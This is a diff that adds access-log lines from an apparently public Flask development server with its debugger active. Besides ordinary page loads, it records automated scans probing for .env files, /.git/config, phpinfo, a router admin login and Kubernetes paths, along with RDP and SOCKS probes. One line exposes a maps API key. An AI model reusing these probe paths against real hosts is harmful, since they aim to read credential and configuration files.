@@ -3596,3 +3596,945 @@ TypeError: byte indices must be integers or slices, not str
  * Restarting with stat
  * Debugger is active!
  * Debugger PIN: 210-353-672
+15.235.118.56 - - [09/Dec/2022 01:10:19] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:10:22] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:16:56] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:16:59] "GET /.env HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 01:26:22] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 01:26:22] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 01:31:01] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 01:31:01] "POST / HTTP/1.1" 405 -
+15.235.118.56 - - [09/Dec/2022 01:33:20] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:33:23] "GET /.env HTTP/1.1" 404 -
+92.118.39.29 - - [09/Dec/2022 01:34:57] "GET / HTTP/1.1" 200 -
+106.75.190.48 - - [09/Dec/2022 01:44:40] "GET / HTTP/1.1" 200 -
+106.75.190.48 - - [09/Dec/2022 01:44:40] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+106.75.190.48 - - [09/Dec/2022 01:44:40] "GET /favicon.ico HTTP/1.1" 404 -
+106.75.190.48 - - [09/Dec/2022 01:44:40] "GET /static/js/index.js HTTP/1.1" 200 -
+45.79.181.104 - - [09/Dec/2022 01:46:18] code 400, message Bad request version ('\x8eì\x1b¼\x91Ø§3Ó\x86\x9etÛãö\x0fî\x06*\x98F=')
+45.79.181.104 - - [09/Dec/2022 01:46:18] "   <^ ì¼Ø§3ÓtÛãöî*F=" HTTPStatus.BAD_REQUEST -
+15.235.118.56 - - [09/Dec/2022 01:47:02] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:47:05] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:51:03] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 01:51:06] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 03:22:26] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 03:22:27] "POST / HTTP/1.1" 405 -
+45.227.254.54 - - [09/Dec/2022 03:41:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.227.254.54 - - [09/Dec/2022 03:41:04] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+45.227.254.54 - - [09/Dec/2022 03:48:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.227.254.54 - - [09/Dec/2022 03:48:11] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+172.105.128.11 - - [09/Dec/2022 03:56:31] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+172.105.128.11 - - [09/Dec/2022 03:56:31] "   sKû/¸óQ»eWJm¾È" HTTPStatus.BAD_REQUEST -
+91.239.157.50 - - [09/Dec/2022 04:08:06] "GET http://91.199.118.155/2.php HTTP/1.1" 404 -
+91.239.157.50 - - [09/Dec/2022 04:08:07] "GET http://91.199.118.155/2.php HTTP/1.1" 404 -
+91.239.157.50 - - [09/Dec/2022 04:08:08] "GET http://91.199.118.155/2.php HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 04:09:20] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 04:09:20] "GET /.env HTTP/1.1" 404 -
+61.253.101.33 - - [09/Dec/2022 04:13:38] "GET / HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:38] "GET /static/css/reset.css HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:38] "GET /static/css/style.css HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/js/index.js HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/assets/like.png HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/assets/search.png HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/assets/call.png HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET / HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/css/style.css HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/css/reset.css HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:39] "GET /static/js/index.js HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:40] "GET /static/assets/house.svg HTTP/1.1" 200 -
+61.253.101.33 - - [09/Dec/2022 04:13:40] "GET /static/assets/house.svg HTTP/1.1" 304 -
+61.253.101.33 - - [09/Dec/2022 04:13:41] "GET /Good_Say HTTP/1.1" 200 -
+15.235.118.56 - - [09/Dec/2022 04:42:26] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 04:42:30] "GET /.env HTTP/1.1" 404 -
+146.190.35.233 - - [09/Dec/2022 04:51:16] code 400, message Bad request version ('À\x13À')
+146.190.35.233 - - [09/Dec/2022 04:51:16] " î  êûïjÆ=*3\¹¸;­W}Yf¼xJ×?eo{õ 1£»KÉ)U+6hÂ~M´¯×ÜèDWæ= &À+À/À,À0Ì©Ì¨À	ÀÀ" HTTPStatus.BAD_REQUEST -
+146.190.35.233 - - [09/Dec/2022 04:51:16] "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 04:54:12] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 04:54:15] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:01:38] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:01:41] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:04:52] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:04:55] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:37:15] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:37:18] "GET /.env HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 05:39:23] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 05:39:23] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:40:59] "GET /.env HTTP/1.1" 404 -
+15.235.118.56 - - [09/Dec/2022 05:41:02] "GET /.env HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 05:45:39] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 05:45:39] "GET /.env HTTP/1.1" 404 -
+45.79.181.179 - - [09/Dec/2022 05:45:52] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+45.79.181.179 - - [09/Dec/2022 05:45:52] "   íÊ" HTTPStatus.BAD_REQUEST -
+185.254.196.115 - - [09/Dec/2022 06:35:33] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 06:35:33] "POST / HTTP/1.1" 405 -
+40.78.158.150 - - [09/Dec/2022 07:20:48] "GET /.env HTTP/1.1" 404 -
+40.78.158.150 - - [09/Dec/2022 07:20:48] "POST / HTTP/1.1" 405 -
+185.254.196.115 - - [09/Dec/2022 07:50:11] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 07:50:12] "POST / HTTP/1.1" 405 -
+39.114.52.132 - - [09/Dec/2022 07:58:33] "GET / HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:33] "GET /static/css/style.css HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:33] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/js/index.js HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/assets/search.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/assets/like.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:34] "GET /static/assets/call.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:35] "GET /Good_Say HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:37] "GET /Login HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:38] "GET /static/css/Login.css HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:38] "GET /favicon.ico HTTP/1.1" 404 -
+39.114.52.132 - - [09/Dec/2022 07:58:39] "GET /Login/find_account HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:40] "GET /static/css/login.css HTTP/1.1" 404 -
+39.114.52.132 - - [09/Dec/2022 07:58:40] "GET /static/css/id,pw.css HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:40] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:41] "POST /User/ResetPW HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:48] "GET /write/2 HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:49] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:49] "GET /static/css/style.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:49] "GET /static/css/write2style.css HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:49] "GET /static/assets/search.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:49] "GET /static/assets/like.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:49] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:50] "GET /Login?loc%20=%20write/2 HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:50] "GET /static/css/Login.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:54] "POST /User/Login HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /write/2 HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /static/css/style.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /static/css/write2style.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /static/assets/like.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "GET /static/assets/search.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:55] "POST /User/Login HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /write/1 HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/css/writestyle.css HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/css/style.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/assets/like.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/assets/search.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 07:58:56] "GET /static/js/write.js HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:58:58] "GET /write/popupmap HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 07:59:00] "GET /static/css/reset.css HTTP/1.1" 304 -
+135.125.217.54 - - [09/Dec/2022 08:01:30] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 08:01:31] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 09:18:37] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 09:18:41] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 09:59:07] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 09:59:08] "GET /.env HTTP/1.1" 404 -
+45.79.181.94 - - [09/Dec/2022 10:00:12] code 400, message Bad request version ('À\x14À')
+45.79.181.94 - - [09/Dec/2022 10:00:12] "   +éººD-yã9 ïù^`D	pã÷cíò££bYÛ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+39.114.52.132 - - [09/Dec/2022 10:02:31] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:02:32] "GET /favicon.ico HTTP/1.1" 404 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET / HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/css/style.css HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/css/reset.css HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/js/index.js HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/assets/like.png HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/assets/search.png HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:24] "GET /static/assets/call.png HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:25] "GET /Good_Say HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:25] "GET /static/assets/house.svg HTTP/1.1" 200 -
+118.235.5.223 - - [09/Dec/2022 10:05:26] "GET /static/assets/house.svg HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET / HTTP/1.1" 200 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/css/style.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/css/reset.css HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/js/index.js HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/assets/search.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/assets/like.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:38] "GET /static/assets/call.png HTTP/1.1" 304 -
+39.114.52.132 - - [09/Dec/2022 10:05:39] "GET /Good_Say HTTP/1.1" 200 -
+92.118.39.29 - - [09/Dec/2022 10:46:48] "GET / HTTP/1.1" 200 -
+103.72.147.115 - - [09/Dec/2022 10:51:35] code 400, message Bad request version ('ÜzìW;û')
+103.72.147.115 - - [09/Dec/2022 10:51:35] "	 'ðu%KÂdM+3®§jÆ An1*èkAú ÜzìW;û" HTTPStatus.BAD_REQUEST -
+103.72.147.115 - - [09/Dec/2022 10:51:48] "GET / HTTP/1.1" 200 -
+103.72.147.115 - - [09/Dec/2022 10:51:55] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+103.72.147.115 - - [09/Dec/2022 10:51:58] "GET /robots.txt HTTP/1.1" 404 -
+103.72.147.115 - - [09/Dec/2022 10:52:01] "GET /sitemap.xml HTTP/1.1" 404 -
+103.72.147.115 - - [09/Dec/2022 10:52:04] "GET /../static/js/index.js HTTP/1.1" 404 -
+103.72.147.115 - - [09/Dec/2022 10:52:04] "GET /dapi.kakao.com/v2/maps/sdk.js?appkey=4c43d4733daa8022e6465b441f59f10c&libraries=services,clusterer,drawing HTTP/1.1" 404 -
+117.216.16.142 - - [09/Dec/2022 11:03:58] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 -
+135.125.217.54 - - [09/Dec/2022 11:04:15] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 11:04:16] "GET /.env HTTP/1.1" 404 -
+193.47.61.121 - - [09/Dec/2022 11:28:56] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [09/Dec/2022 11:56:26] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 11:56:27] "GET /.env HTTP/1.1" 404 -
+172.105.128.13 - - [09/Dec/2022 11:58:54] code 400, message Bad request version ('À\x14À')
+172.105.128.13 - - [09/Dec/2022 11:58:54] "   åíx¯Ce¶õHMÉé!AÌÇ±÷þû   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+95.214.235.205 - - [09/Dec/2022 12:19:58] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 12:19:59] "POST / HTTP/1.1" 405 -
+209.145.49.53 - - [09/Dec/2022 12:26:15] "GET / HTTP/1.1" 200 -
+146.190.68.28 - - [09/Dec/2022 12:50:10] code 400, message Bad request version ('À\x14À')
+146.190.68.28 - - [09/Dec/2022 12:50:10] " {  w³I;ÊnµER}ÂDÓ²FoB[>îjh$ió]Òþ$÷  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+146.190.68.28 - - [09/Dec/2022 12:50:11] code 400, message Bad request version ('À\x14À')
+146.190.68.28 - - [09/Dec/2022 12:50:11] " {  w¶bñ}A{Ì¢"QÌçÒKM±¾Ï]Ì7ò÷  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+146.190.68.28 - - [09/Dec/2022 12:50:11] "GET / HTTP/1.1" 200 -
+198.235.24.139 - - [09/Dec/2022 12:55:30] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x14vë\x958_§\x14\x18õfÈô\x15\x03¹¨êZBg'£V\x86\x9fÅ3²\x84ç|\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+198.235.24.139 - - [09/Dec/2022 12:55:30] " Ê  Ævë8_§õfÈô¹¨êZBg'£VÅ3²ç|  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+192.241.210.142 - - [09/Dec/2022 12:58:12] "GET / HTTP/1.1" 200 -
+95.214.235.205 - - [09/Dec/2022 13:14:58] "GET /.env HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 13:19:08] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 13:19:08] "GET /.env HTTP/1.1" 404 -
+45.227.254.54 - - [09/Dec/2022 13:40:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.227.254.54 - - [09/Dec/2022 13:40:18] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+52.224.243.156 - - [09/Dec/2022 13:53:57] "GET /.git/config HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:53:57] "GET /application/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:53:58] "POST /application/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:53:58] "GET /apps/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:53:58] "POST /apps/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:53:59] "GET /.env.save HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:53:59] "POST /.env.save HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:00] "GET /script/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:00] "POST /script/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:00] "GET /back/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:01] "POST /back/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:01] "GET /.env.project HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:01] "POST /.env.project HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:02] "GET /cp/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:02] "POST /cp/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:03] "GET /fedex/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:03] "POST /fedex/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:03] "GET /cms/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:04] "POST /cms/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:04] "GET /api/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:05] "POST /api/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:05] "GET /local/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:05] "POST /local/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:06] "GET /sources/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:06] "POST /sources/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:07] "GET /app/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:07] "POST /app/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:07] "GET /system/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:08] "POST /system/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:08] "GET /docker/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:09] "POST /docker/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:09] "GET /.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:09] "POST /.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:10] "GET /core/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:10] "POST /core/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:10] "GET /.env.prod HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:11] "POST /.env.prod HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:11] "GET /enviroments/.env.production HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:12] "POST /enviroments/.env.production HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:12] "GET /.env.old HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:12] "POST /.env.old HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:13] "GET /development/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:13] "POST /development/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:14] "GET /laravel/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:14] "POST /laravel/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:14] "GET /shared/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:15] "POST /shared/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:15] "GET /.env.development HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:15] "POST /.env.development HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:16] "GET /rest/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:16] "POST /rest/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:17] "GET /.env.production HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:17] "POST /.env.production HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:17] "GET /enviroments/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:18] "POST /enviroments/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:18] "GET /admin-app/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:19] "POST /admin-app/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:19] "GET /.env.dist HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:19] "POST /.env.dist HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:20] "GET /private/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:20] "POST /private/.env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:21] "GET /live_env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:21] "POST /live_env HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:21] "GET /frontend_dev.php/$ HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:22] "GET /debug/default/view?panel=config HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:22] "GET /config.json HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:23] "GET /.json HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:23] "GET /info.php HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:23] "GET /_profiler/phpinfo HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:24] "GET /phpinfo.php HTTP/1.1" 404 -
+52.224.243.156 - - [09/Dec/2022 13:54:24] "GET /?phpinfo=1 HTTP/1.1" 200 -
+134.195.208.121 - - [09/Dec/2022 14:04:59] "GET /.env HTTP/1.1" 404 -
+134.195.208.121 - - [09/Dec/2022 14:04:59] "POST / HTTP/1.1" 405 -
+172.104.11.51 - - [09/Dec/2022 14:07:12] code 400, message Bad request version ('À\x14À')
+172.104.11.51 - - [09/Dec/2022 14:07:12] "   >¾ò¥l 3jÆZkÔ?Û«{¶ôLô   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [09/Dec/2022 14:10:10] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [09/Dec/2022 14:10:10] " " HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [09/Dec/2022 14:10:16] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [09/Dec/2022 14:10:16] " " HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [09/Dec/2022 14:10:23] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [09/Dec/2022 14:10:23] " " HTTPStatus.BAD_REQUEST -
+184.105.247.232 - - [09/Dec/2022 14:10:35] "GET / HTTP/1.1" 200 -
+5.188.210.227 - - [09/Dec/2022 14:11:50] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [09/Dec/2022 14:11:50] " P¼Òã " HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [09/Dec/2022 14:11:56] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [09/Dec/2022 14:11:56] " P¼Òã " HTTPStatus.BAD_REQUEST -
